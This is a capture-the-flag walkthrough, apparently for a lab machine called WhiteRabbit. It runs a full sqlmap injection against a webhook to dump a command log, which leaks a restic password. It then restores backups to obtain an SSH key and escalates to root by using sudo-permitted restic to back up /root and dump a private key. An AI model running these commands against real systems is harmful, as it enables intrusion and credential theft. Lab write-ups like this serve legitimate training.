

we manage to find some subdomains 
	status.whitrabbit.htb then just bruteforcing directories for interesting files 

--> first in http://status.whiterbbit.htb/status/temp/ we trigger to have some new domains

	here are all we found 

		ddb09a8558c9.whiterabbit.htb	

		a668910b5514e.whiterabbit.htb	

		28efa8f7df.whiterabbit.htb


	so the few we got , we take the last one for pentesting it 
			we came onto a todo list website ; 
		
		then trying to see all to do , we see http://a668910b5514e.whiterabbit.htb/en/gophish_webhooks
		we saw this lines 

				Database Interactions

		    User Validation: Checks if the user’s email from the event is present in the database.

		    Phishing Score Update: Depending on the user’s action, their phishing susceptibility score is updated. Actions like clicking a phishing link or submitting data through a phishing form negatively impact their score.

		    Debugging and Error Handling: Notably, there is a debug node labeled "DEBUG: REMOVE SOON" that aids in troubleshooting by providing error messages when things go awry. This node is temporary and will be removed once the workflow is fully operational and stable.

		    Conditional Logic: The workflow includes conditions to handle different scenarios, such as actions taken by the user (e.g., clicking a link or submitting data), and adjusts the phishing score accordingly.

Understand the trully purpose of that , we're figure out that the target should be vulnerable to  sqli 
		So using sqlmap , this is the full command , i ommitted the steps to retrieve database and table we interest on

		# Sqli testing

		sqlmap -u http://28efa8f7df.whiterabbit.htb/webhook/d96af3a4-21bd-4bcb-bd34-37bfc67dfd1d --method POST --data '{"campaign_id":2,"email":"test@mail.com","message":"Clicked Linka"}' -p email --proxy http://127.0.0.1:8080/ --batch --dump --level=5 --risk=3 -D temp -T command_log --flush


		# Note  that  it could take a bit longer but hopefully we do it right , alternatively , i redirect the traffic to my burp instance crawler this is why you see --proxy tag 


						+----+---------------------+--------------------------------------------------
				----------------------------+
				| id | date
				| command
				|
				+----+---------------------+--------------------------------------------------
				----------------------------+
				| 1 | 2024-08-30 10:44:01 | uname -a
				|
				| 2 | 2024-08-30 11:58:05 | restic init --repo
				rest:http://75951e6ff.whiterabbit.htb
				|
				| 3 | 2024-08-30 11:58:36 | echo ygcsvCuMdfZ89yaRLlTKhe5jAmth7vxw  >
				.restic_passwd
				|
				| 4 | 2024-08-30 11:59:02 | rm -rf .bash_history
				|
				| 5 | 2024-08-30 11:59:47 | #thatwasclose
				|
				| 6 | 2024-08-30 14:40:42 | cd /home/neo/ && /opt/neo-password-generator/neo-
				password-generator | passwd |
				+----+---------------------+--------------------------------------------------
				----------------------------+


	Ok , let's thinking , that seems to be a restic manager repo , so the user inits a restic on the new subdomain 

	let's try to enum available repos in this . 
			restic --repo rest:http://75951e6ff.whiterabbit.htb snapshots
 					so paste the password once prompted

 	what we do now is to restore the repo in our machine : restic --repo rest:http://75951e6ff.whiterabbit.htb restore [id] --target path_you_wanna_save

 	Once done , you'll find a 7-ZIP archive file in it  that's locked ; crack it and then use the private inside to log as bobn on the system 

 			ssh -i id_rsa bob@whiterabbit.htb -p 2222

 	Logging in as bob 

 			bob@ebdce80611e9:~$ sudo -l
					Matching Defaults entries for bob on ebdce80611e9:
					    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

					User bob may run the following commands on ebdce80611e9:
					    (ALL) NOPASSWD: /usr/bin/restic
# Exploitation TIme 

	init a repo : sudo /usr/bin/restic init -r u //I use u as repo name et also set u as pass , use whatever you want 
	backup the root folder : sudo /usr/bin/restic -r u backup /root/
	list element inside of backup you do : sudo restic -r u ls latest

		repository fe1f08a9 opened (version 2, compression level auto)
		[0:00] 100.00%  1 / 1 index files loaded
		snapshot 0b7e5bf4 of [/root] filtered by [] at 2025-04-11 15:26:59.73174016 +0000 UTC):
		/root
		/root/.bash_history
		/root/.bashrc
		/root/.cache
		/root/.profile
		/root/.ssh
		/root/morpheus
		/root/morpheus.pub
	got interesting things , move on to grab morpheus key :
			sudo restic -r u dump latest /root/morpheus

	Now , copy the ouput and get connected as morpheus on 22 ssh port  and enjoy the user's flag
		 
